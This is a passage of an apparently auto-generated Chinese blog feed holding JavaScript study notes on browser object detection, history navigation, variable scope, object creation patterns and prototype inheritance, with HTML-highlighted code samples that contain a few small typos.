class="keyword">new</span> ActiveXObject(name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ex)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasFlash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = hasPlugin(<span class="string">"Flash"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!result)&#123;</span><br><span class="line">    result = hasIEPlugin(<span class="string">"ShockwaveFlash.ShockwaveFlash"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-判断浏览器类型"><a href="#6-2-判断浏览器类型" class="headerlink" title="6.2 判断浏览器类型"></a>6.2 判断浏览器类型</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExploreName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> userAgent = navigator.userAgent;</span><br><span class="line">  <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Opera"</span>) &gt; <span class="number">-1</span> || userAgent.indexOf(<span class="string">"OPR"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Opera'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"compatible"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"MSIE"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Edge"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Edge'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Firefox"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Firefox'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Chrome"</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Safari'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Chrome"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Chrome'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!!<span class="built_in">window</span>.ActiveXObject || <span class="string">"ActiveXObject"</span> <span class="keyword">in</span> <span class="built_in">window</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE&gt;=11'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Unkonwn'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-screen"><a href="#7-screen" class="headerlink" title="7. screen"></a>7. screen</h3><p>表示浏览器窗口外部的显示器的信息，如像素宽高。<br><br></p><h3 id="8-history"><a href="#8-history" class="headerlink" title="8. history"></a>8. history</h3><p><code>history</code>对象保存着用户上网的历史记录。出于安全考虑，开发人员无法得知用户浏览过的URL。但是使用<code>go()</code>方法可以在用户的历史记录中任意跳转。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">history.go(<span class="number">-1</span>);   <span class="comment">// 后退一页</span></span><br><span class="line">history.go(<span class="number">1</span>);    <span class="comment">// 前进一页</span></span><br><span class="line">history.go(<span class="number">2</span>);    <span class="comment">// 前进两页</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 跳转到历史记录中 最近的 包含改字符串的地址，可能前进可能后退</span></span><br><span class="line">history.go(<span class="string">"wrox.com"</span>)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h3><ul><li>setTimeout, clearTimeout</li><li>setInterval, clearInterval</li><li>系统对话框 alert(), confirm(), prompt()</li><li>显示打印对话框 window.print()</li><li>显示查找对话框 window.find()</li><li>可能被浏览器禁用的方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.moveTo(0, 0)         将窗口移动到屏幕左上角</span><br><span class="line">window.moveBy(0, 100)       将窗口向下移动100像素</span><br><span class="line">window.resizeTo(100, 100)   将窗口调整到100 * 100</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《Javscript高级程序设计》 第八章 BOM</li><li>《Javascript高级程序设计》第九章 客户端监测</li><li><a href="https://segmentfault.com/a/1190000007640795" target="_blank" rel="noopener">JS 获得浏览器类型和版本</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>《Javascript高级程序设计》</title>
      <link href="/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/"/>
      <url>/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-script"><a href="#1-script" class="headerlink" title="1. script"></a>1. script</h3><p><em><code>&lt;script&gt;</code></em>的6个属性：async, charset, defer, language, src, type<br>与解析嵌入式Javascript代码一样，在解析外部Javascript文件时(包括下载文件)，页面的处理会暂时停止。无论如何包含代码，只要不存在defer和async属性，浏览器都会按照<code>&lt;script&gt;</code>元素在页面中出现的先后顺序对它依次进行解析。第一个script元素包含的代码解析完后，第二个才会被解析。</p><p><em>延迟脚本</em><br>脚本会被延迟到整个页面都解析完毕后再运行。defer属性只适用于外部文件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”defer</span>=<span class="string">”defer”src</span>=<span class="string">”example.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><em>异步脚本</em><br>async只适用于外部文件。指定async的目的是不让页面等待两个脚本下载和执行，从而异步加载页面其他内容。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">”example.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2.基本概念"></a>2.基本概念</h3><p>JS的变量是松散类型的，所谓松散类型就是可以用来保存任何类型的数据。换句话说，每个变量仅仅是一个用于保存值得占位符。<code>var message</code>未经初始化的变量，会保存一个特殊的值——undefined。用var操作符定义的变量会成为定义改变量的作用域中的局部变量。如果在函数中使用var定义一个变量，那么这个变量在函数退出后会被销毁。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="string">"Hi"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line">alert(message);  <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure></p><p><em>typeof</em><br>检查变量的数据类型，返回Undefined, boolean, string, number, object, function</p><p><em>instanceof</em><br>如果变量是给定引用类型的实例（根据原型链识别），那么instanceof会返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(person instanceof Object)  // 变量person是Object吗？ </span><br><span class="line">alert(colors instanceof Array)   // 变量colors是Array吗？</span><br></pre></td></tr></table></figure></p><p><em>boolean</em><br>对任何数据类型值调用Boolean()函数，总是会返回一个boolean值。</p><table><thead><tr><th>数据类型</th><th style="text-align:center">转换为true的值</th><th style="text-align:right">转换为false的值</th></tr></thead><tbody><tr><td>Boolean</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>String</td><td style="text-align:center">任何非空字符串</td><td style="text-align:right">“”(空字符串)</td></tr><tr><td>Number</td><td style="text-align:center">任何非零数字值(包括无穷大)</td><td style="text-align:right">0和NaN</td></tr><tr><td>Object</td><td style="text-align:center">任何对象</td><td style="text-align:right">null</td></tr><tr><td>Undefined</td><td style="text-align:center">n/a</td><td style="text-align:right">undefined</td></tr></tbody></table><p><em>NaN</em><br>确定这个参数是否“不是数值”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">isNaN(NaN)     // true</span><br><span class="line">isNaN(10)      // false</span><br><span class="line">isNaN(&quot;10&quot;)    // false</span><br><span class="line">isNaN(&quot;blue&quot;)  // true</span><br><span class="line">isNaN(true)    // false(可以转换为数值1)</span><br></pre></td></tr></table></figure></p><p><em>数值转换</em><br>parseInt: 如果第一个字符是数字字符，直到遇到一个非数字字符。无法解析返回NaN<br>parseFloat: 从第一个字符开始解析，直到遇见一个无效的浮点数字字符为止。</p><p><em>退出循环</em><br><code>break</code>会立即退出循环，强制继续执行循环后面的语句。<br><code>continue</code>会立即退出循环，但退出循环后会从循环的顶部继续执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">    <span class="comment">// continue;</span></span><br><span class="line">  &#125;</span><br><span class="line">  num++;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 4</span></span><br><span class="line">alert(num); <span class="comment">// continue: 8</span></span><br></pre></td></tr></table></figure></p><p>break和continue都可以与label语句联合使用，从而返回代码中特定的位置。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">outermost;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">5</span> &amp;&amp; j == <span class="number">5</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span> outermost;</span><br><span class="line">      <span class="comment">// continue outermost;</span></span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 55，break不仅会退出j循环，还会退出i循环</span></span><br><span class="line">alert(num); <span class="comment">// continue: 95, continue退出内部循环，执行外部循环，i=5,j=6~10不会被执行</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="3-变量、作用域和内存问题"><a href="#3-变量、作用域和内存问题" class="headerlink" title="3.变量、作用域和内存问题"></a>3.变量、作用域和内存问题</h3><p>Undefined, Null, Boolean, Number, String这5种基本数据类型是按值访问，可以操作在变量中实际的值。引用类型的值是按引用访问的。</p><p><br></p><h4 id="3-1-复制变量值"><a href="#3-1-复制变量值" class="headerlink" title="3.1 复制变量值"></a>3.1 复制变量值</h4><ul><li>复制一个基本类型的值，会在变量对象上创建一个新值，然后把该值复制到位新变量分配的位置上。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var num1 = 5;</span><br><span class="line">var num2 = num1;</span><br><span class="line">// num1中的5和num2中的5是完全独立的。两个变量不会相互影响。</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/《Javascript高级程序设计》/1.png" style="max-width:250px"><br><br></p><ul><li>复制一个引用类型的值，同样会将存储在变量对象中的值复制一份放到新变量分配的空间中。不同的是，这个值的副本实际上是一个指针，这个指针指向存储在堆中的一个对象。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj1 = new Object();</span><br><span class="line">var obj2 = obj1;</span><br><span class="line">obj1.name = ‘mike’;</span><br><span class="line">alert(obj2.name)  // ‘mike’</span><br><span class="line">// 复制后，两个变量实际上将引用同一个对象。因此，改变其中一个变量，就会影响另一个变量。</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/《Javascript高级程序设计》/2.png" style="max-width:400px"></p><p><br></p><h4 id="4-2-执行环境与作用域"><a href="#4-2-执行环境与作用域" class="headerlink" title="4.2 执行环境与作用域"></a>4.2 执行环境与作用域</h4><p>执行环境定义了变量或函数有权访问的数据。每个执行环境都有一个与之关联的<em>变量对象</em>，环境中定义的所有变量和函数都保存在这个对象中。虽然我们编写的代码无法访问这个对象，但解析器在处理数据时会在后台使用它。</p><ul><li><p>全局执行环境<br>在Web浏览器中，全局执行环境被认为是<code>window</code>对象。</p></li><li><p>函数的执行环境<br>每个函数都有自己的<em>执行环境</em>。当执行流进入一个函数时，函数的环境就会被推入一个环境栈中。在函数执行之后，栈将其环境弹出，把控制权返回给之前的执行环境。</p></li></ul><p>当代码在一个环境中执行时，会创建变量对象的一个<em>作用域链</em>。作用域链的用途，是保证对执行环境有权访问的所有变量和函数的有序访问。内部环境可以通过作用域链访问所有的外部环境，但外部环境不能访问内部环境中的变量和函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var color = &quot;blue&quot;;</span><br><span class="line">function changeColor()&#123;</span><br><span class="line">    var anotherColor = &quot;red&quot;;</span><br><span class="line">    function swapColors()&#123;</span><br><span class="line">        var tempColor = anotherColor;</span><br><span class="line">        anotherColor = color;</span><br><span class="line">        color = tempColor;</span><br><span class="line">        // 这里可以访问color、anotherColor和tempColor </span><br><span class="line">    &#125;</span><br><span class="line">    // 这里可以访问color和anotherColor，但不能访问tempColor</span><br><span class="line">    swapColors();</span><br><span class="line">&#125;</span><br><span class="line">// 这里只能访问color changeColor();</span><br></pre></td></tr></table></figure></p><p><br><br><em>没有块级作用域</em><br>在其他类C的语言中，由<code>{}</code>封闭的代码块都有自己的作用域。但在JS中，<code>if</code>语句中的变量生命会将变量添加到当前的执行环境中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true)&#123;</span><br><span class="line">  var color = &quot;blue&quot;;</span><br><span class="line">&#125;</span><br><span class="line">alert(color);  // &quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>由for语句创建的变量i即使在for循环执行结束后，也依旧会存在于循环外部的执行环境汇总。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">  doSomething(i);</span><br><span class="line">&#125;</span><br><span class="line">alert(i);  // 10</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-创建对象"><a href="#6-创建对象" class="headerlink" title="6. 创建对象"></a>6. 创建对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  year: <span class="number">2004</span>,</span><br><span class="line">  edition: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(book, <span class="string">'year'</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>,  <span class="comment">// 不能从对象中删除属性</span></span><br><span class="line">  enumerable: <span class="literal">true</span>,     <span class="comment">// 可以通过for-in循环返回属性</span></span><br><span class="line">  writable: <span class="literal">false</span>,      <span class="comment">// 只读不可修改</span></span><br><span class="line">  value: <span class="string">'Nicholas'</span>,</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.year;   <span class="comment">// 当js中读取到year这一属性，就会触发getter函数</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set: functtion(newValue)&#123;</span><br><span class="line">    <span class="comment">// 当js执行year = newValue; 就会触发setter函数。除了修改值，还可以做一些其他操作</span></span><br><span class="line">    <span class="keyword">if</span> (newValue &gt; <span class="number">2004</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.year = newValue;   </span><br><span class="line">      <span class="keyword">this</span>.edition += newValue - <span class="number">2004</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取属性的值</span></span><br><span class="line"><span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(book, <span class="string">'year'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(year.value);        <span class="comment">// 2004</span></span><br><span class="line"><span class="built_in">console</span>.log(year.configurable); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="6-1-构造函数"><a href="#6-1-构造函数" class="headerlink" title="6.1 构造函数"></a>6.1 构造函数</h4><p><code>new</code>一个新实例会经历以下4个步骤: 创建一个新对象；将构造函数的作用域赋给新对象(this指向这个新对象); 执行构造函数中的代码(为这个新对象添加属性); 返回新对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">'Greg'</span>, <span class="number">27</span>, <span class="string">'Doctor'</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">'Nicholas'</span>, <span class="number">29</span>, <span class="string">'Software Enginner'</span>);</span><br></pre></td></tr></table></figure></p><p>person1和person2分别保存着Person的不同实例。这两个对象都有一个constructor构造函数属性，该属性指向Person。</p><p>使用<code>call()</code>或<code>apply()</code>在某个特殊对象的作用域中调用<code>Person()</code>函数。这里是在对象o的作用域中调用，因此调用后o就拥有了所有属性和sayName()方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">Person.call(o, <span class="string">'Kristen'</span>, <span class="number">25</span>, <span class="string">'Nurse'</span>);</span><br><span class="line">o.sayName();   <span class="comment">// "Kristen"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-原型模式"><a href="#6-2-原型模式" class="headerlink" title="6.2 原型模式"></a>6.2 原型模式</h4><p>每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象实例的信息，而是可以将这些信息直接添加到原型对象中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = <span class="string">'Nicholas'</span>;</span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line">person.sayName(); <span class="comment">// "Nicholas"</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/26/《Javascript高级程序设计》/3.png" style="max-width:500px"></p><p><br></p><ul><li><p>hasOwnProperty()<br>检测一个属性是存在于实例中，还是存在于原型中。</p></li><li><p>in操作符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>));   <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"name"</span> <span class="keyword">in</span> person1);                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>更简洁的写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span> : Person,</span><br><span class="line">  name: 'Nicholas',</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>原型对象的问题<br>由于name存在于Person.prototype而非person1中，当person1.name被修改时，这个修改也会通过person2.name反映出来。因此我们很少单独使用原型模式。</p></li></ul><p><br></p><h4 id="6-3-组合使用构造函数模式和原型模式"><a href="#6-3-组合使用构造函数模式和原型模式" class="headerlink" title="6.3 组合使用构造函数模式和原型模式"></a>6.3 组合使用构造函数模式和原型模式</h4><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性。结果，每个实例都有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度地节省了内存。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.friends = [<span class="string">'Amy'</span>, <span class="string">'Mike'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: Person,</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-寄生模式"><a href="#6-4-寄生模式" class="headerlink" title="6.4 寄生模式"></a>6.4 寄生模式</h4><p>当我们想创建一个具有额外方法的特殊数组，由于不能直接修改Array构造函数，因此可以用这个模式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SpecialArray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> values = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  <span class="comment">// 添加值</span></span><br><span class="line">  values.push.apply(values, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加方法</span></span><br><span class="line">  values.toPiedString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.join(<span class="string">"|"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> colors = <span class="keyword">new</span> SpecialArray(<span class="string">"red"</span>, <span class="string">"blue"</span>, <span class="string">"green"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(colors.toPipedString());  <span class="comment">// "red|blue|green"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-继承"><a href="#7-继承" class="headerlink" title="7. 继承"></a>7. 继承</h3><h4 id="7-1-原型链"><a href="#7-1-原型链" class="headerlink" title="7.1 原型链"></a>7.1 原型链</h4><p>让原型对象等于另一个类的实例。创建SuperType的实例，并将实例赋值给SubType.prototype。本质是重写原型对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 